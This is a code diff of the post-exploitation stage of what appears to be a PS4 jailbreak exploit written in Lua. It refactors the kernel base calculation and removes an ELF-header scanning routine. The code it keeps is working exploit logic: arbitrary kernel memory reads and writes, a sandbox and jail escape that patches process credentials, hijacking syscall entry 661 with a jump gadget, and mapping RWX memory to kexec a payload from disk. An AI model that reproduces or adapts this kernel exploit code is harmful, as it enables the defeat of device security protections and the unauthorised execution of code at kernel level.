@@ -1637,7 +1637,7 @@ end
 function post_exploitation_ps4()
 
     -- if we havent found evf string offset, assume we havent found every kernel offsets yet for this fw
-    if not kernel_offset.EVF_OFFSET then
+    if not kernel_offset.SYSENT_661_OFFSET then
         printf("fw not yet supported for jailbreaking")
         return
     end
@@ -1650,18 +1650,18 @@ function post_exploitation_ps4()
     -- credit: @egycnq
     local function calculate_kbase(leaked_evf_ptr)
         local evf_offset = kernel_offset.EVF_OFFSET
-        return leaked_evf_ptr - evf_offset
+        kernel.addr.data_base = leaked_evf_ptr - evf_offset
     end
     
     -- ELF validation
     -- credit: @egycnq
-    local function verify_elf_header(kbase)
-        local b0 = kernel.read_byte(kbase):tonumber()
-        local b1 = kernel.read_byte(kbase + 1):tonumber()
-        local b2 = kernel.read_byte(kbase + 2):tonumber()
-        local b3 = kernel.read_byte(kbase + 3):tonumber()
+    local function verify_elf_header()
+        local b0 = kernel.read_byte(kernel.addr.data_base):tonumber()
+        local b1 = kernel.read_byte(kernel.addr.data_base + 1):tonumber()
+        local b2 = kernel.read_byte(kernel.addr.data_base + 2):tonumber()
+        local b3 = kernel.read_byte(kernel.addr.data_base + 3):tonumber()
     
-        printf("ELF header bytes at %s:", hex(kbase))
+        printf("ELF header bytes at %s:", hex(kernel.addr.data_base))
         printf("  [0] = 0x%02X", b0)
         printf("  [1] = 0x%02X", b1)
         printf("  [2] = 0x%02X", b2)
@@ -1674,58 +1674,11 @@ function post_exploitation_ps4()
         end
     end
     
-    -- Brute scan for ELF with Target ID validation
-    -- credit: @egycnq
-    local function find_kbase(leaked_ptr, max_scan)
-        local ELF0, ELF1, ELF2, ELF3 = 0x7F, 0x45, 0x4C, 0x46
-        local static_offset = kernel_offset.EVF_OFFSET
-        local static_kbase = leaked_ptr - static_offset
-        local target_id_offset = kernel_offset.TARGET_ID_OFFSET
-    
-        printf("Static KBASE guess based on EVF offset (0x%X): %s", static_offset, hex(static_kbase))
-    
-        local page_size = 0x1000
-        local PAGE_MASK = uint64("0xFFFFFFFFFFFFF000")
-        local aligned_leaked = bit64.band(leaked_ptr, PAGE_MASK)
-        printf(" aligned addr = %s", hex(aligned_leaked))
-    
-        for offset = 0, max_scan, page_size do
-            printf(" Scanning offset: 0x%X", offset)
-    
-            local addr = aligned_leaked - offset
-            printf("trying addr = %s", hex(addr))
-            local b0 = kernel.read_byte(addr):tonumber()
-            local b1 = kernel.read_byte(addr + 1):tonumber()
-            local b2 = kernel.read_byte(addr + 2):tonumber()
-            local b3 = kernel.read_byte(addr + 3):tonumber()
-    
-            if b0 == ELF0 and b1 == ELF1 and b2 == ELF2 and b3 == ELF3 then
-                printf(" Found ELF header at: %s", hex(addr))
-    
-                local tid_addr = addr + target_id_offset
-                local tid = kernel.read_byte(tid_addr):tonumber()
-    
-                if tid >= 0x80 and tid <= 0x8F then
-                    printf(" Valid Target ID: 0x%02X at %s — confirmed KBASE", tid, hex(tid_addr))
-                    local evf_offset = leaked_ptr - addr
-                    printf(" Hint: static EVF offset for this firmware = %s", hex(evf_offset))
-                    printf(" You can reuse this offset %s next time instead of scanning.", hex(evf_offset))
-                    return addr
-                else
-                    printf(" Target ID check failed (0x%02X) at %s — continuing", tid, hex(tid_addr))
-                end
-            end
-        end
-    
-        print(" ELF header not found — fallback to static guess")
-        return static_kbase
-    end
-    
     -- Sandbox escape
     -- credit: @egycnq
-    local function escape_sandbox(kbase, curproc)
-        local PRISON0   = kbase + kernel_offset.PRISON0
-        local ROOTVNODE = kbase + kernel_offset.ROOTVNODE
+    local function escape_sandbox(curproc)
+        local PRISON0   = kernel.addr.data_base + kernel_offset.PRISON0
+        local ROOTVNODE = kernel.addr.data_base + kernel_offset.ROOTVNODE
     
         local OFFSET_P_UCRED = 0x40
     
@@ -1752,20 +1705,21 @@ function post_exploitation_ps4()
         print("Sandbox escape complete ... root FS access and jail broken")
     end
 
-    function apply_patches_to_kernel_data_ps4(kbase)
+    function apply_patches_to_kernel_data_ps4()
         local mapping_addr = uint64(0x920100000)
         local shadow_mapping_addr = uint64(0x926100000)
         
-        local sysent_661_addr = kbase + kernel_offset.SYSENT_661_OFFSET
+        local sysent_661_addr = kernel.addr.data_base + kernel_offset.SYSENT_661_OFFSET
         local sy_narg = kernel.read_dword(sysent_661_addr):tonumber()
         local sy_call = kernel.read_qword(sysent_661_addr + 8):tonumber()
         local sy_thrcnt = kernel.read_dword(sysent_661_addr + 0x2c):tonumber()
 
-        kernel.write_dword(sysent_661_addr, 6)
-        kernel.write_qword(sysent_661_addr + 8, kbase + kernel_offset.JMP_RSI_GADGET)
+        kernel.write_dword(sysent_661_addr, 2)
+        kernel.write_qword(sysent_661_addr + 8, kernel.addr.data_base + kernel_offset.JMP_RSI_GADGET)
         kernel.write_dword(sysent_661_addr + 0x2c, 1)
         
         syscall.resolve({
+            munmap = 0x49,
             jitshm_create = 0x215,
             jitshm_alias = 0x216,
         })
@@ -1782,7 +1736,7 @@ function post_exploitation_ps4()
         -- read payload from disk
         local bin_data = file_read(payload_path)
         local bin_data_addr = lua.resolve_value(bin_data)
-        printf("File read to address: 0x%x", bin_data_addr:tonumber())
+        printf("File read to address: 0x%x, %d bytes", bin_data_addr:tonumber(), #bin_data)
         
         -- create shm with exec permission
         local exec_handle = syscall.jitshm_create(0, aligned_memsz, PROT_RWX)
@@ -1798,23 +1752,24 @@ function post_exploitation_ps4()
         syscall.mmap(mapping_addr, aligned_memsz, PROT_RWX, 0x11, exec_handle, 0)
         printf("First bytes: 0x%x", memory.read_dword(mapping_addr):tonumber())
         
-        -- execute payload
         syscall.kexec(mapping_addr)
         
         print("After kexec")
         
-        kernel.write_dword(sysent_661_addr + 0x2c, sy_thrcnt)
-        kernel.write_qword(sysent_661_addr + 8, sy_call)
         kernel.write_dword(sysent_661_addr, sy_narg)
+        kernel.write_qword(sysent_661_addr + 8, sy_call)
+        kernel.write_dword(sysent_661_addr + 0x2c, sy_thrcnt)
+        
+        syscall.close(write_handle)
     end
     
     -- Run post-exploit logic
     local proc = kernel.addr.curproc
-    local kbase = calculate_kbase(evf_ptr)
-    printf("Kernel Base Candidate: %s", hex(kbase))
-    verify_elf_header(kbase)
-    escape_sandbox(kbase, proc)
-    apply_patches_to_kernel_data_ps4(kbase)
+    calculate_kbase(evf_ptr)
+    printf("Kernel Base Candidate: %s", hex(kernel.addr.data_base))
+    verify_elf_header()
+    escape_sandbox(proc)
+    apply_patches_to_kernel_data_ps4()
 end
 
 
